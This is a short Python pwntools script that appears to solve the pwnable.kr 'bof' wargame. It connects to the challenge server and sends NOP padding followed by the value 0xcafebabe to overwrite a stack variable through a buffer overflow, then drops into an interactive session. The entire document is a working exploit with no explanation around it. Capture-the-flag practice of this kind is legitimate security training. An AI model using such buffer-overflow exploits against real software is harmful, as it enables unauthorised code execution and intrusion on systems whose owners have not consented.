###Simple bof to overwrite value

from pwn import *

r = remote('pwnable.kr',9000)
payload = b'\x90'*(0x2c+0x8)+p32(0xcafebabe)
r.sendline(payload)
r.interactive()
